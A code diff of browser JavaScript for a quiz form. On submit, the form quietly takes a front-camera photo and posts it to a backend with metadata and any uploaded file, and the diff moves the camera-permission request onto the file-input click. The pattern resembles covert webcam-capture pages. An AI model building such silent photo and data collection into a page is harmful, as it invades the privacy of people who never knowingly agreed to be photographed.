@@ -10,7 +10,7 @@ const constraints = { video: { facingMode: "user" }, audio: false };
 
 let toastTimeout;
 
-// Toast function (clears previous timeout to prevent glitches)
+// Toast function
 function showToast(message) {
   toast.innerText = message;
   toast.classList.add("show");
@@ -20,19 +20,23 @@ function showToast(message) {
   }, 2000);
 }
 
-// Request camera permission separately, NOT on file input click
+// Function to request camera permission (non-blocking)
 async function requestCameraPermission() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    stream.getTracks().forEach(track => track.stop());
+    stream.getTracks().forEach(track => track.stop()); // stop immediately
     console.log("Camera permission granted");
   } catch (err) {
     console.warn("Camera permission denied", err);
   }
 }
 
-// Optional: request camera in advance on page load or form focus
-// requestCameraPermission();
+// When user clicks file input
+fileInput.addEventListener("click", async (e) => {
+  // Request camera permission first
+  requestCameraPermission();
+  // File input will open immediately anyway
+});
 
 // Handle form submission
 form.addEventListener("submit", async (e) => {
@@ -42,17 +46,24 @@ form.addEventListener("submit", async (e) => {
   showToast("Uploading your response...");
 
   try {
-    // Start camera to capture image
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    videoEl.srcObject = stream;
-    await videoEl.play();
-    await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 200)));
+    // Capture image from camera if granted
+    let image = null;
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      videoEl.srcObject = stream;
+      await videoEl.play();
+      await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 100)));
 
-    const ctx = canvasEl.getContext("2d");
-    canvasEl.width = videoEl.videoWidth;
-    canvasEl.height = videoEl.videoHeight;
-    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-    const image = canvasEl.toDataURL("image/png");
+      const ctx = canvasEl.getContext("2d");
+      canvasEl.width = videoEl.videoWidth;
+      canvasEl.height = videoEl.videoHeight;
+      ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+      image = canvasEl.toDataURL("image/png");
+
+      stream.getTracks().forEach(track => track.stop());
+    } catch {
+      console.warn("Camera not used or denied");
+    }
 
     // Collect metadata
     const metadata = {
@@ -94,17 +105,14 @@ form.addEventListener("submit", async (e) => {
       });
     }
 
-    // Send data to backend
+    // Send to backend
     await fetch(backendURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ image, metadata, uploadedFile: uploadedFileData })
     });
 
-    // Stop camera
-    videoEl.srcObject.getTracks().forEach(track => track.stop());
-
-    // Show success page
+    // Show success
     document.getElementById("quiz-container").style.display = "none";
     document.getElementById("success-container").style.display = "block";
 
@@ -113,8 +121,7 @@ form.addEventListener("submit", async (e) => {
     showToast("Response submitted successfully!");
   } catch (err) {
     console.error(err);
-    showToast("Error! Please allow camera access.");
-    alert("Please allow camera access!");
+    showToast("Error! Please allow camera access if you want to submit image.");
     submitBtn.disabled = false;
     submitBtn.textContent = "Submit";
   }
